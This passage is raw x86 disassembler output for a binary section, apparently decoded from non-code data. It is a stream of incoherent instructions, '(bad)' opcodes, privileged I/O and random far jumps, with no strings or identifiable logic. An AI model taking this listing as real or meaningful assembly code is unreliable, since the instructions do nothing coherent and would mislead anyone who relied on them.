  4158fa:	jb     0x415919
  4158fc:	pop    DWORD PTR ds:0x58b79c73
  415902:	add    ebp,ebx
  415904:	pop    esi
  415905:	popf   
  415906:	fadd   QWORD PTR [ebp-0x6eb9c715]
  41590c:	fmul   QWORD PTR [ebx-0x74852d75]
  415912:	push   edi
  415913:	dec    esp
  415914:	pop    eax
  415915:	xchg   ecx,eax
  415916:	dec    ebx
  415917:	lahf   
  415918:	sbb    edi,DWORD PTR ds:0x406f910a
  41591e:	xchg   edi,eax
  41591f:	out    0x83,eax
  415921:	scas   al,BYTE PTR es:[edi]
  415922:	pop    DWORD PTR [eax]
  415924:	xor    eax,0x87e8c4f0
  415929:	jno    0x4158c0
  41592b:	stos   DWORD PTR es:[edi],eax
  41592c:	inc    edx
  41592d:	inc    esp
  41592e:	pusha  
  41592f:	or     bh,BYTE PTR [eax-0x22d793a6]
  415935:	les    edi,FWORD PTR [edi]
  415937:	out    0x3c,al
  415939:	stc    
  41593a:	push   0xffffffb8
  41593c:	xchg   ebx,edi
  41593e:	mov    esi,0xa668d1d3
  415943:	retf   0x2c80
  415946:	icebp  
  415947:	push   eax
  415948:	fwait
  415949:	jge    0x41599d
  41594b:	pop    esp
  41594c:	dec    edx
  41594d:	pop    esi
  41594e:	mov    edi,0x90aa1ebe
  415953:	shl    ebx,1
  415955:	or     eax,DWORD PTR [edx+0x53]
  415958:	xchg   ebx,eax
  415959:	fdivr  DWORD PTR [esp+edi*4-0x7425db34]
  415960:	icebp  
  415961:	jo     0x4158ff
  415963:	jae    0x41591c
  415965:	ror    cl,cl
  415967:	(bad)  
  415968:	loopne 0x4158fa
  41596a:	and    esp,ebp
  41596c:	push   esp
  41596d:	sbb    DWORD PTR [ebp-0x17df34a8],ebx
  415973:	leave  
  415974:	sahf   
  415975:	or     al,BYTE PTR [esi]
  415977:	pop    ebp
  415978:	(bad)
  41597b:	sub    BYTE PTR [ecx-0x4d],cl
  41597e:	fwait
  41597f:	mov    bh,0x82
  415981:	jle    0x4159ad
  415983:	ins    DWORD PTR es:[edi],dx
  415984:	dec    eax
  415985:	cs in  al,0xd7
  415988:	idiv   ah
  41598a:	pop    esp
  41598b:	das    
  41598c:	jecxz  0x415a02
  41598e:	sub    eax,0x6aa87ee4
  415993:	stc    
  415994:	xor    eax,0x2fe7f9e
  415999:	add    esp,edi
  41599b:	dec    ebx
  41599c:	mov    ?,WORD PTR [ebp+esi*2-0x25]
  4159a0:	adc    al,0x70
  4159a2:	cmp    eax,0x3d1e5568
  4159a7:	fpatan 
  4159a9:	div    ah
  4159ab:	jne    0x41596e
  4159ad:	leave  
  4159ae:	ret    
  4159af:	lods   al,BYTE PTR ds:[esi]
  4159b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159b1:	lds    ecx,FWORD PTR [edi+esi*1]
  4159b4:	sti    
  4159b5:	outs   dx,DWORD PTR ds:[esi]
  4159b6:	inc    esp
  4159b7:	test   BYTE PTR [edi+ebp*1],dh
  4159ba:	mov    eax,?
  4159bc:	or     al,0x26
  4159be:	and    BYTE PTR [esi],cl
  4159c0:	out    0x0,eax
	...
  415a32:	add    BYTE PTR [eax],al
  415a34:	lahf   
  415a35:	fnstcw WORD PTR [esi]
  415a37:	ss jle 0x415a31
  415a3a:	lahf   
  415a3b:	stc    
  415a3c:	inc    ecx
  415a3d:	jb     0x415a8e
  415a3f:	lahf   
  415a40:	pop    esi
  415a41:	cmp    DWORD PTR [ebx+0xed3427],edx
  415a47:	add    ch,dh
  415a49:	add    BYTE PTR [eax],al
  415a4b:	add    BYTE PTR [eax+eiz*1-0x279db8a7],ch
  415a52:	push   0x8deb03e5
  415a57:	ss jmp 0x6e3b:0x4d0c2042
  415a5f:	cmp    BYTE PTR [edi-0x58],al
  415a62:	pop    edi
  415a63:	std    
  415a64:	ret    0x1e47
  415a67:	ins    BYTE PTR es:[edi],dx
  415a68:	jb     0x415ad4
  415a6a:	sahf   
  415a6b:	sbb    DWORD PTR [ecx],edi
  415a6d:	pushf  
  415a6e:	out    dx,eax
  415a6f:	push   ss
  415a70:	outs   dx,DWORD PTR ds:[esi]
  415a71:	xor    dl,BYTE PTR [esi+eax*4]
  415a74:	mov    edx,0x3fd04bfc
  415a79:	(bad)  
  415a7a:	jb     0x415a62
  415a7c:	pop    edi
  415a7d:	sar    DWORD PTR [ebx-0x33dbf62a],1
  415a83:	jnp    0x415a7a
  415a85:	sub    BYTE PTR [edi-0x638f5a08],dh
  415a8b:	daa    
  415a8c:	hlt    
  415a8d:	into   
  415a8e:	outs   dx,DWORD PTR ds:[esi]
  415a8f:	sub    bh,BYTE PTR [ebp+0x1fc37ff9]
  415a95:	mov    esi,0x5fed71a9
  415a9a:	lods   eax,DWORD PTR ds:[esi]
  415a9b:	mov    edi,0x8c35fa66
  415aa0:	aam    0xb4
  415aa2:	xchg   ecx,eax
  415aa3:	add    esi,DWORD PTR [ebx]
  415aa5:	jne    0x415a29
  415aa7:	adc    al,0x8d
  415aa9:	inc    edi
  415aaa:	xchg   ecx,eax
  415aab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aac:	push   cs
  415aad:	jmp    0xa03d5a1a
  415ab2:	and    eax,0x8215b550
  415ab7:	xchg   ebx,eax
  415ab8:	stc    
  415ab9:	leave  
  415aba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415abb:	or     dh,BYTE PTR [edx]
  415abd:	pusha  
  415abe:	jb     0x415b22
  415ac0:	js     0x415af4
  415ac2:	(bad)  [esi]
  415ac4:	xor    ecx,DWORD PTR [esi+0x13f28494]
  415aca:	push   esp
  415acb:	int3   
  415acc:	mov    eax,ds:0x299b7ae5
  415ad1:	mov    bl,al
  415ad3:	int    0x93
  415ad5:	push   es
  415ad6:	mov    edx,0x76f56f41
  415adb:	paddsw mm0,QWORD PTR [eax-0x75]
  415adf:	and    DWORD PTR [eax+0x2a8f2bf0],edx
  415ae5:	out    0x31,al
  415ae7:	mov    BYTE PTR ds:0x4f943d52,cl
  415aed:	jmp    0x415b16
  415aef:	sub    eax,0x76932975
  415af4:	dec    ebx
  415af5:	inc    ebp
  415af6:	cdq    
  415af7:	inc    ebp
  415af8:	(bad)  
  415af9:	adc    DWORD PTR [eax-0x59b528b4],esi
  415aff:	sub    eax,0xea6ff4eb
  415b04:	xchg   esi,eax
  415b05:	push   ss
  415b06:	cmp    ebp,esp
  415b08:	dec    edi
  415b09:	in     al,0x88
  415b0b:	dec    ebx
  415b0c:	enter  0x907e,0x25
  415b10:	or     esi,eax
  415b12:	aam    0x45
  415b14:	mov    bl,BYTE PTR [edi]
  415b16:	jae    0x415af0
  415b18:	test   BYTE PTR [edx+esi*8-0x504d3411],cl
  415b1f:	retf   
  415b20:	xchg   DWORD PTR [ecx+ebx*2-0x68ed73eb],edi
  415b27:	mov    ecx,0xdf9eb1cc
  415b2c:	ds mov dh,0xd6
  415b2f:	add    edi,DWORD PTR [ebp-0x6ed66212]
  415b35:	out    dx,al
  415b36:	test   DWORD PTR [ecx],ebx
  415b38:	(bad)  
  415b39:	enter  0xab2c,0x23
  415b3d:	or     eax,DWORD PTR [esi-0x24]
  415b40:	sub    BYTE PTR [eax],al
	...
  415bb2:	add    BYTE PTR [eax],al
  415bb4:	xor    al,0x64
  415bb6:	push   ds
  415bb7:	jl     0x415c17
  415bb9:	jle    0x415c31
  415bbb:	ins    BYTE PTR es:[edi],dx
  415bbc:	pop    ds
  415bbd:	dec    DWORD PTR [edi+0x5a]
  415bc0:	(bad)  
  415bc1:	sbb    al,0x5c
  415bc3:	mov    esi,0xee29
  415bc8:	cmc    
  415bc9:	add    BYTE PTR [eax],al
  415bcb:	add    BYTE PTR [esi+0xd],bl
  415bce:	int    0x7b
  415bd0:	lds    edi,FWORD PTR [ebx+0x4a7d6fef]
  415bd6:	lea    edi,[ebx-0x2c4a5573]
  415bdc:	cli    
  415bdd:	mov    esp,0x9c7b30e3
  415be2:	ds fwait
  415be4:	gs inc ecx
  415be6:	mov    ds:0x787a3b05,eax
  415beb:	fcom   QWORD PTR [edx]
  415bed:	ss or  al,0xa7
  415bf0:	or     DWORD PTR [eax],ebx
  415bf2:	pop    ecx
  415bf3:	cmc    
  415bf4:	sub    al,0x64
  415bf6:	bound  esi,QWORD PTR [esp+esi*1+0x2c39dbac]
  415bfd:	addr16 inc edx
  415bff:	jecxz  0x415c4d
  415c01:	arpl   cx,ax
  415c03:	data16 mov ch,0x4e
  415c06:	or     BYTE PTR [ebx-0x74],dh
  415c09:	not    ah
  415c0b:	or     bl,BYTE PTR [ecx+edi*2+0x47]
  415c0f:	push   edi
  415c10:	in     al,0x9d
  415c12:	adc    esp,edi
  415c14:	push   esp
  415c15:	mov    ebx,0x4022e23e
  415c1a:	iret   
  415c1b:	pushf  
  415c1c:	push   eax
  415c1d:	add    DWORD PTR [ebx+edx*1],edi
  415c20:	adc    DWORD PTR [eax-0x57df6cd6],edx
  415c26:	aad    0xb3
  415c28:	in     al,0xbc
  415c2a:	adc    edi,edi
  415c2c:	mov    cl,0xa7
  415c2e:	jo     0x415c6b
  415c30:	cmc    
  415c31:	lea    esi,[edi]
  415c33:	in     al,0x4f
  415c35:	xlat   BYTE PTR ds:[ebx]
  415c36:	nop
  415c37:	cmp    eax,0xde13704e
  415c3c:	std    
  415c3d:	pushf  
  415c3e:	xor    DWORD PTR [edi+0x4785ce62],ecx
  415c44:	push   es
  415c45:	leave  
  415c46:	test   BYTE PTR [esi-0x10af1e56],0x5d
  415c4d:	xor    bl,al
  415c4f:	(bad)  
  415c50:	jmp    0x3860:0xfd3c030a
  415c57:	sbb    esp,DWORD PTR [ebx+0x30]
  415c5a:	clc    
  415c5b:	push   ebx
  415c5d:	sahf   
  415c5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c5f:	mov    esp,0xcc3a1cdb
  415c64:	clc    
  415c65:	pop    ebp
  415c66:	nop
  415c67:	mov    esp,0xe47a183
  415c6c:	(bad)  
  415c6d:	dec    esi
  415c6e:	bound  ecx,QWORD PTR [ebx-0x7fc3e904]
  415c74:	ret    
  415c75:	enter  0x807f,0x78
  415c79:	cli    
  415c7a:	into   
  415c7b:	pop    eax
  415c7c:	cmp    ebp,DWORD PTR [ecx+esi*1]
  415c7f:	lods   al,BYTE PTR ds:[esi]
  415c80:	jecxz  0x415c85
  415c82:	inc    esp
  415c83:	jecxz  0x415cec
  415c85:	(bad)  
  415c86:	fistp  WORD PTR [edx-0x49]
  415c89:	jmp    0xfe52:0xa028dc37
  415c90:	scas   eax,DWORD PTR es:[edi]
  415c91:	sahf   
  415c92:	mov    ch,0x7d
  415c94:	inc    ecx
  415c95:	popf   
  415c96:	sar    DWORD PTR [ebx+0x5a],cl
  415c99:	sbb    edi,ecx
  415c9b:	pop    ecx
  415c9c:	xlat   BYTE PTR ds:[ebx]
  415c9d:	cmc    
  415c9e:	shl    edx,cl
  415ca0:	push   es
  415ca1:	lods   al,BYTE PTR ds:[esi]
  415ca2:	std    
  415ca3:	jg     0x415c6d
  415ca5:	or     al,0x10
  415ca7:	and    DWORD PTR [ebp-0xc5b9413],eax
  415cad:	and    al,0x9f
  415caf:	dec    edx
  415cb0:	inc    edx
  415cb1:	cmp    dh,BYTE PTR [edx+0xe28e4ae]
  415cb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cb8:	jne    0x415cef
  415cba:	bound  edi,QWORD PTR [esi]
  415cbc:	jnp    0x415c94
  415cbe:	pop    ds
  415cbf:	jne    0x415c58
	...
  415d31:	add    BYTE PTR [eax],al
  415d33:	add    BYTE PTR [edi+0x3e911299],dh
  415d39:	fwait
  415d3a:	mov    bh,0xbf
  415d3c:	pop    ebp
  415d3d:	jmp    0xdf5b:0x71ade72f
  415d44:	push   ds
  415d45:	out    dx,eax
  415d46:	add    BYTE PTR [eax],al
  415d48:	cmc    
  415d49:	add    BYTE PTR [eax],al
  415d4b:	add    BYTE PTR [ebp-0x3e],ch
  415d4e:	test   al,0x59
  415d50:	adc    al,0xf9
  415d52:	push   eax
  415d53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d54:	pop    esp
  415d55:	cmp    cl,ch
  415d57:	adc    eax,0x3031269b
  415d5c:	mov    ds:0x6c204829,al
  415d61:	lods   eax,DWORD PTR ds:[esi]
  415d62:	xor    ch,BYTE PTR [edx+0x49]
  415d65:	xor    al,0xef
  415d67:	dec    esi
  415d68:	push   ebx
  415d69:	push   esp
  415d6a:	cld    
  415d6b:	sub    eax,0x29b96076
  415d70:	dec    eax
  415d71:	jbe    0x415d1a
  415d73:	dec    eax
  415d74:	cdq    
  415d75:	jb     0x415dcb
  415d77:	rol    DWORD PTR [ecx+0x1a],1
  415d7a:	(bad)  
  415d7b:	out    0xd6,al
  415d7d:	test   DWORD PTR [edi-0x50],0x98bdad38
  415d84:	mov    ah,0x63
  415d86:	push   esp
  415d87:	rol    DWORD PTR [ecx],1
  415d89:	cmp    eax,0x69b88191
  415d8e:	dec    edx
  415d8f:	icebp  
  415d90:	js     0x415dfd
  415d92:	push   ecx
  415d93:	or     al,dl
  415d95:	test   ch,ah
  415d97:	pop    ds
  415d98:	sbb    dl,BYTE PTR [esi-0x20b22f5c]
  415d9e:	shr    esi,cl
  415da0:	push   es
  415da1:	mov    ds:0x49051352,eax
  415da6:	xlat   BYTE PTR ds:[ebx]
  415da7:	mov    fs,WORD PTR [esi+0x13]
  415daa:	sub    esp,0x36df9134
  415db0:	cli    
  415db1:	in     al,0x5f
  415db3:	mov    al,0xe9
  415db5:	add    al,bh
  415db7:	sbb    al,0x2
  415db9:	int3   
  415dba:	mov    esi,0xb615fdbd
  415dbf:	and    edx,edx
  415dc1:	inc    eax
  415dc2:	jp     0x415e1a
  415dc4:	push   esp
  415dc5:	and    al,ah
  415dc7:	mov    BYTE PTR [edx-0x27],bh
  415dca:	je     0x415d72
  415dcc:	ror    BYTE PTR ds:0xfdd77cc0,1
  415dd2:	jge    0x415ddc
  415dd4:	lods   al,BYTE PTR ds:[esi]
  415dd5:	(bad)  
  415dd6:	xor    dl,BYTE PTR [esi-0xb]
  415dd9:	sbb    al,0xf2
  415ddb:	push   edi
  415ddc:	dec    ecx
  415ddd:	out    0xbb,al
  415ddf:	xchg   esp,eax
  415de0:	ja     0x415dd8
  415de2:	retf   
  415de3:	cli    
  415de4:	push   ebx
  415de5:	push   ds
  415de6:	sub    BYTE PTR [eax-0x22a3f0a4],bl
  415dec:	mov    eax,0x4e622a5b
  415df1:	jno    0x415df4
  415df3:	xchg   esi,eax
  415df4:	fbstp  TBYTE PTR [ebx]
  415df6:	iret   
  415df7:	sub    bh,BYTE PTR [ebx]
  415df9:	xlat   BYTE PTR ds:[ebx]
  415dfa:	in     al,0xd0
  415dfc:	push   ebp
  415dfd:	or     BYTE PTR [edi-0x241142b7],al
  415e03:	pop    ebx
  415e04:	jb     0x415da5
  415e06:	sets   BYTE PTR [ebx-0x68aea49c]
  415e0d:	jae    0x415e3d
  415e0f:	or     edx,edx
  415e11:	jle    0x415ddb
  415e13:	dec    ebx
  415e14:	rol    BYTE PTR [edx],0x83
  415e17:	sbb    al,0x9c
  415e19:	pushf  
  415e1a:	nop
  415e1b:	lock xchg ecx,eax
  415e1d:	dec    ecx
  415e1e:	dec    esp
  415e1f:	aam    0xef
  415e21:	aam    0x1a
  415e23:	or     eax,0x2bf6f55d
  415e28:	int    0xb2
  415e2a:	scas   al,BYTE PTR es:[edi]
  415e2b:	push   esi
  415e2c:	push   esi
  415e2d:	data16 aas 
  415e2f:	retf   
  415e30:	popf   
  415e31:	jnp    0x415e92
  415e33:	cdq    
  415e34:	shl    BYTE PTR [ecx+0x16],0x35
  415e38:	ja     0x415e6c
  415e3a:	add    ebx,DWORD PTR [edi]
  415e3c:	test   BYTE PTR [edi-0x14],cl
  415e3f:	sti    
  415e40:	inc    esp
	...
  415eb1:	add    BYTE PTR [eax],al
  415eb3:	add    BYTE PTR [edi],dh
  415eb5:	data16 xor al,0x9b
  415eb8:	jne    0x415e95
  415eba:	mov    edi,0xdeb84bee
  415ebf:	gs push ecx
  415ec1:	sbb    al,0x70
  415ec3:	stc    
  415ec4:	adc    esi,eax
  415ec6:	add    BYTE PTR [eax],al
  415ec8:	cmc    
  415ec9:	add    BYTE PTR [eax],al
  415ecb:	add    BYTE PTR [ebp+0x51],ah
  415ece:	(bad)  
  415ecf:	dec    edi
  415ed0:	cli    
  415ed1:	in     al,dx
  415ed2:	xor    ecx,esi
  415ed4:	cmp    eax,0xa4e1ef7
  415ed9:	imul   ah
  415edb:	mov    ds:0x4fdf8ebf,al
  415ee1:	idiv   BYTE PTR [ebx+ebp*8]
  415ee4:	(bad)  
  415ee5:	jp     0x415e6f
  415ee7:	sbb    dh,bl
  415ee9:	loop   0x415f62
  415eeb:	sbb    al,BYTE PTR [esi]
  415eed:	test   eax,0x86deb66f
  415ef2:	loopne 0x415f42
  415ef4:	sbb    ebp,DWORD PTR [esi-0x30f94439]
  415efa:	push   cs
  415efb:	cmp    BYTE PTR [eax-0x9169cd],cl
  415f01:	adc    eax,0x84146f8d
  415f06:	inc    edx
  415f07:	dec    ecx
  415f08:	pop    ebp
  415f09:	adc    bl,al
  415f0b:	xchg   esp,eax
  415f0c:	test   al,0xb
  415f0e:	jg     0x415ed0
  415f10:	ret    0xa6cd
  415f13:	xor    eax,0x7e566302
  415f18:	not    BYTE PTR [edx-0x52a61336]
  415f1e:	dec    eax
  415f1f:	sahf   
  415f20:	ins    DWORD PTR es:[edi],dx
  415f21:	push   eax
  415f22:	(bad)  
  415f23:	inc    esi
  415f24:	icebp  
  415f25:	sub    al,0xc3
  415f27:	imul   edi,DWORD PTR [edi-0x7e],0x39
  415f2b:	hlt    
  415f2c:	leave  
  415f2d:	and    eax,0x8a433151
  415f32:	adc    edi,DWORD PTR [ebp-0x28]
  415f35:	mov    bh,0x40
  415f37:	mov    eax,ds:0xaf02d9f5
  415f3c:	mov    esp,0x240e0218
  415f41:	pop    ebx
  415f42:	into   
  415f43:	adc    bl,BYTE PTR [ebx]
  415f45:	jmp    0x1dc6:0x10fa252f
  415f4c:	inc    ebx
  415f4d:	adc    al,0x1d
  415f4f:	push   edx
  415f50:	and    dh,ch
  415f52:	jae    0x415fcb
  415f54:	(bad)  
  415f55:	push   ss
  415f56:	or     bh,dh
  415f58:	cmp    eax,DWORD PTR [esi-0x751e89d9]
  415f5e:	pop    edi
  415f5f:	stc    
  415f60:	push   ebp
  415f61:	cmc    
  415f62:	or     edi,DWORD PTR [ebx]
  415f64:	(bad)  fs:[ebx]
  415f67:	xchg   ecx,ebp
  415f69:	mov    esp,fs
  415f6b:	fs loope 0x415fe3
  415f6e:	and    al,0xf6
  415f70:	jmp    0x8f4baed3
  415f75:	push   edx
  415f76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f77:	fucomp st(0)
  415f79:	(bad)  [edx+0x64]
  415f7c:	lea    eax,[edi-0x55]
  415f7f:	add    al,BYTE PTR [ebx]
  415f81:	(bad)  
  415f82:	xor    esp,eax
  415f84:	dec    edx
  415f85:	mov    ecx,0x17aa20ba
  415f8a:	mov    al,0x20
  415f8c:	lds    esi,FWORD PTR [edi-0x27ef7e34]
  415f92:	call   0x4e8e:0x8c05d8d2
  415f99:	ret    
  415f9a:	add    BYTE PTR [edi+ebp*2],bh
  415f9d:	cwde   
  415f9e:	loope  0x415f7c
  415fa0:	push   edi
  415fa1:	pop    esp
  415fa2:	inc    esp
  415fa3:	sub    ah,BYTE PTR [esi-0x54]
  415fa6:	daa    
  415fa7:	fwait
  415fa8:	and    eax,0xb6008acc
  415fad:	repz rcl eax,1
  415fb0:	cwde   
  415fb1:	add    ch,0x92
  415fb4:	xchg   ecx,eax
  415fb5:	rcr    BYTE PTR [ebx+0x75f52307],0xb6
  415fbc:	lock std 
  415fbe:	mov    ch,0xea
  415fc0:	sub    al,0x0
	...
  416032:	add    BYTE PTR [eax],al
  416034:	jnp    0x416038
  416036:	add    ebp,ebx
  416038:	jnp    0x416025
  41603a:	sti    
  41603b:	xchg   edx,eax
  41603c:	rol    al,cl
  41603e:	(bad)  
  41603f:	imul   edi,DWORD PTR [ecx],0xffffff91
  416042:	dec    eax
  416043:	out    0x8,eax
  416045:	icebp  
  416046:	add    BYTE PTR [eax],al
  416048:	cmc    
  416049:	add    BYTE PTR [eax],al
  41604b:	add    dh,ah
  41604d:	scas   eax,DWORD PTR es:[edi]
  41604e:	fs push cs
  416050:	ss xchg edx,eax
  416052:	aas    
  416053:	xlat   BYTE PTR ds:[ebx]
  416054:	mov    ch,0x7a
  416056:	cmp    BYTE PTR [ebx-0x76],dh
  416059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41605a:	repz pop ss
  41605c:	and    BYTE PTR [ebp+0x7382e373],al
  416062:	sbb    BYTE PTR ds:0xe95e72d2,cl
  416068:	mov    dl,0xee
  41606a:	fisub  WORD PTR [si-0x571b]
  41606f:	clc    
  416070:	adc    ecx,DWORD PTR [esi+0x2b]
  416073:	ds jle 0x416063
  416076:	jge    0x41608f
  416078:	gs ret 
  41607a:	(bad)  
  41607b:	xchg   edi,eax
  41607c:	and    ah,BYTE PTR [ebx-0x5d]
  41607f:	pop    es
  416080:	mov    ecx,0x9ba8a2b1
  416085:	es loope 0x4160ca
  416088:	and    esi,DWORD PTR [ecx+0x5c]
  41608b:	popa   
  41608c:	xlat   BYTE PTR ds:[ebx]
  41608d:	test   DWORD PTR [esi+0x4f08727a],eax
  416093:	cli    
  416094:	repnz hlt 
  416096:	cmp    dh,cl
  416098:	jmp    0x8a411597
  41609d:	retf   
  41609e:	xor    ah,BYTE PTR [edi-0x39ec8f0a]
  4160a4:	push   ebx
  4160a5:	mov    al,0xb1
  4160a7:	mov    ch,0xdb
  4160a9:	in     eax,dx
  4160aa:	pusha  
  4160ab:	loopne 0x416111
  4160ad:	stos   DWORD PTR es:[edi],eax
  4160ae:	call   0x2bc8:0xd0998976
  4160b5:	sub    ah,bl
  4160b7:	arpl   WORD PTR [esi-0x3d7a874f],dx
  4160bd:	cmp    al,0x81
  4160bf:	xor    dl,0xcc
  4160c2:	int3   
  4160c3:	adc    DWORD PTR [ecx+ecx*1],esp
  4160c6:	cmp    ebx,esi
  4160c8:	and    edi,0x79
  4160cb:	fild   DWORD PTR [eax-0x59]
  4160ce:	push   ebx
  4160cf:	dec    edx
  4160d0:	sti    
  4160d1:	mov    ebx,0x4e790024
  4160d6:	adc    al,0xa8
  4160d8:	sbb    esp,eax
  4160da:	sub    BYTE PTR [ebp+0xc053063],0x1c
  4160e1:	(bad)  
  4160e2:	stos   DWORD PTR es:[edi],eax
  4160e3:	xor    ah,bh
  4160e5:	jne    0x416133
  4160e7:	out    0x58,al
  4160e9:	call   0xdda93c4d
  4160ee:	mov    bl,0xd6
  4160f0:	fld    DWORD PTR [edi-0x3]
  4160f3:	adc    al,BYTE PTR [ebp+0x534ad8e5]
  4160f9:	jmp    0x41609c
  4160fb:	mov    ch,0x3f
  4160fd:	mov    dl,0x6a
  4160ff:	cli    
  416100:	ins    BYTE PTR es:[edi],dx
  416101:	mov    dh,0xde
  416103:	lock cmp BYTE PTR [edi-0x44],0x39
  416108:	jmp    0x1073:0x255a89f8
  41610f:	cmp    DWORD PTR [edx],esp
  416111:	(bad)  
  416112:	cld    
  416113:	aas    
  416114:	lds    ecx,FWORD PTR [eax+eiz*8]
  416117:	inc    ebp
  416118:	aas    
  416119:	cmp    BYTE PTR [ecx],0xdb
  41611c:	mov    ds:0xbf8cdb5d,al
  416121:	jecxz  0x4160b9
  416123:	shl    DWORD PTR ds:0xbb7a717,cl
  416129:	mov    dh,0x54
  41612b:	mov    eax,0x373d68e3
  416130:	or     DWORD PTR ds:0x15d7f0c3,esi
  416136:	rcl    WORD PTR [edx+0x7c],1
  41613a:	mov    dh,0x2b
  41613c:	out    0xa,al
  41613e:	fidiv  WORD PTR [edi-0x7d]
	...
  4161b1:	add    BYTE PTR [eax],al
  4161b3:	add    BYTE PTR [edi+edx*4],ch
  4161b6:	pop    ds
  4161b7:	sar    DWORD PTR [edi-0x8001127],1
  4161bd:	test   al,0xcb
  4161bf:	sub    edx,ebx
  4161c1:	retf   
  4161c2:	and    eax,0xf1fd3b
  4161c7:	add    ch,dh
  4161c9:	add    BYTE PTR [eax],al
  4161cb:	add    BYTE PTR ds:0xb04f0f81,bl
  4161d1:	(bad)
  4161d4:	lock add DWORD PTR [edi],0xffffffdb
  4161d8:	pop    ebx
  4161d9:	ins    BYTE PTR es:[edi],dx
  4161da:	lods   eax,DWORD PTR gs:[esi]
  4161dc:	stos   DWORD PTR es:[edi],eax
  4161dd:	fidiv  WORD PTR [ebp-0x4730e9f0]
  4161e3:	push   eax
  4161e4:	push   0xffffffb4
  4161e6:	and    esp,DWORD PTR [eax]
  4161e8:	jp     0x4161c1
  4161ea:	mov    ch,0xbc
  4161ec:	fsub   DWORD PTR [ebx+0x77]
  4161ef:	retf   
  4161f0:	cmp    eax,0x4b321b58
  4161f5:	pop    ebx
  4161f6:	inc    ebx
  4161f7:	fcmovb st,st(0)
  4161f9:	adc    ebx,DWORD PTR [edx+0x579920f1]
  4161ff:	jecxz  0x416243
  416201:	ins    DWORD PTR es:[edi],dx
  416202:	jmp    0x5ffd:0x8b20b3c8
  416209:	dec    ebp
  41620a:	rcl    DWORD PTR [ebx+0x38],0xe
  41620e:	je     0x4161d6
  416210:	je     0x4161e3
  416212:	add    eax,0x1658d241
  416217:	outs   dx,DWORD PTR ds:[esi]
  416218:	sbb    ebx,0x74
  41621b:	aaa    
  41621c:	and    dh,dh
  41621e:	mov    al,ds:0x9b0e0f7a
  416223:	sub    esp,ebx
  416225:	retf   0x3a22
  416228:	pusha  
  416229:	jp     0x416282
  41622b:	push   edx
  41622c:	outs   dx,BYTE PTR ds:[esi]
  41622d:	pop    esi
  41622e:	push   edi
  41622f:	pop    edx
  416230:	add    BYTE PTR ds:0x93be7ae6,0x49
  416237:	adc    al,0x61
  416239:	cmp    cl,BYTE PTR [ecx]
  41623b:	stc    
  41623c:	xchg   ecx,eax
  41623d:	jecxz  0x4161c8
  41623f:	leave  
  416240:	cmp    dl,dh
  416242:	loope  0x41626e
  416244:	mov    BYTE PTR [edx-0x1],dh
  416247:	sub    eax,0xddb6c567
  41624c:	iret   
  41624d:	add    bl,BYTE PTR [ecx]
  41624f:	sub    DWORD PTR [esi+0x1ca1dad0],eax
  416255:	ins    DWORD PTR es:[edi],dx
  416256:	mov    bl,0xc6
  416258:	fdivr  QWORD PTR [ebx]
  41625a:	mov    ebx,DWORD PTR [ecx-0x5daf61bf]
  416260:	mov    ebx,DWORD PTR [ecx-0x50608937]
  416266:	les    esi,FWORD PTR [ebx+0x37]
  416269:	push   0x49ecfa48
  41626e:	hlt    
  41626f:	in     al,0x5
  416271:	xchg   ebx,eax
  416272:	js     0x416292
  416274:	enter  0xb702,0x6
  416278:	push   ebx
  416279:	test   DWORD PTR [eax-0x2d04485e],edx
  41627f:	cmp    eax,0xbb03296e
  416284:	xchg   esp,eax
  416285:	js     0x416238
  416287:	call   0x7b9ea83a
  41628c:	ret    0x1df2
  41628f:	xor    bx,WORD PTR [ebx+0x6400db5e]
  416296:	call   0x64dc:0x5f453e6a
  41629d:	xlat   BYTE PTR ds:[ebx]
  41629e:	sub    DWORD PTR [edi-0x4cf44110],0x7e
  4162a5:	push   esp
  4162a6:	xor    ecx,esi
  4162a8:	push   ecx
  4162a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162aa:	shl    edi,cl
  4162ac:	(bad)  
  4162ad:	jmp    0x3056aece
  4162b2:	ror    DWORD PTR [ebx+0x2538e18a],cl
  4162b8:	adc    ah,BYTE PTR [ecx-0x7f4dc7fd]
  4162be:	mov    bh,0x7e
  4162c0:	pop    ebx
	...
  416331:	add    BYTE PTR [eax],al
  416333:	add    BYTE PTR [ebp-0x10],ch
  416336:	repz jmp FWORD PTR cs:[edi]
  41633a:	std    
  41633b:	repz push eax
  41633d:	xchg   ecx,eax
  41633e:	scas   al,BYTE PTR es:[edi]
  41633f:	fld    QWORD PTR [edi-0xd3d2f41]
  416345:	repnz add BYTE PTR [eax],al
  416348:	cmc    
  416349:	add    BYTE PTR [eax],al
  41634b:	add    BYTE PTR [esi-0x33],bl
  41634e:	in     al,dx
  41634f:	jns    0x41635f
  416351:	ret    0xd85f
  416354:	daa    
  416355:	out    dx,al
  416356:	arpl   WORD PTR [esi+0x17],sp
  416359:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41635a:	jbe    0x4163aa
  41635c:	cwde   
  41635d:	add    DWORD PTR [eax-0x67],ebx
  416360:	mov    ds:0x576a9a18,al
  416365:	test   BYTE PTR [ebx+0x13],dl
  416368:	int3   
  416369:	out    0xe1,al
  41636b:	les    edi,FWORD PTR [edx]
  41636d:	adc    al,0x80
  41636f:	and    DWORD PTR [ebx],0xe89b6c7
  416375:	int    0xd
  416377:	in     eax,dx
  416378:	sbb    al,dl
  41637a:	dec    esi
  41637b:	adc    BYTE PTR [esi-0x2d],0xbf
  41637f:	mov    cs,WORD PTR [edx]
  416381:	out    0x48,al
  416383:	fdivrp st(1),st
  416385:	xchg   edx,eax
  416386:	ret    0x60d1
  416389:	outs   dx,BYTE PTR ds:[esi]
  41638a:	xor    eax,0x9956c2a1
  41638f:	mov    bh,0x8c
  416391:	ja     0x41631c
  416393:	mov    ch,0x76
  416395:	ins    BYTE PTR es:[edi],dx
  416396:	mov    BYTE PTR [ebx],bh
  416398:	sbb    ecx,DWORD PTR es:[edi+esi*2-0x6a495e10]
  4163a0:	jno    0x4163c4
